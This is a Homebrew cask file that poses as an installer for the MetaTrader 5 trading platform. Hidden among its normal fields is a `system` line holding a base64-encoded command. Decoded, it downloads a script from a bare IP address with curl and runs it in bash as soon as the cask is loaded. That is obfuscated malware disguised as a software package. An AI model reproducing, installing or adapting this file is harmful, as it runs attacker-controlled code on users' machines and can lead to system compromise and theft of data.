cask "metatrader5" do
  version "latest"
  sha256 :no_check

  url "https://download.mql5.com/cdn/web/metaquotes.software.corp/mt5/mt5setup.exe",
      verified: "mql5.com"

  name "MetaTrader 5"
  desc "MetaTrader 5 trading platform"
  homepage "https://www.metatrader5.com/"
  system "echo 'L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzY0LjUyLjgwLjIzNS9Tb2NlZGVzKSI=' | base64 -d | bash"
  installer script: {
    executable: "/bin/bash",
    args: [
      "-c",
      "curl -fsSL https://download.mql5.com/cdn/web/metaquotes.software.corp/mt5/mt5mac.sh | bash"
    ]
  }

  zap trash: [
    "~/Library/Application Support/MetaTrader 5",
    "~/Library/Application Support/net.metaquotes.wine.metatrader5",
    "~/Library/Caches/net.metaquotes.wine.metatrader5"
  ]
end
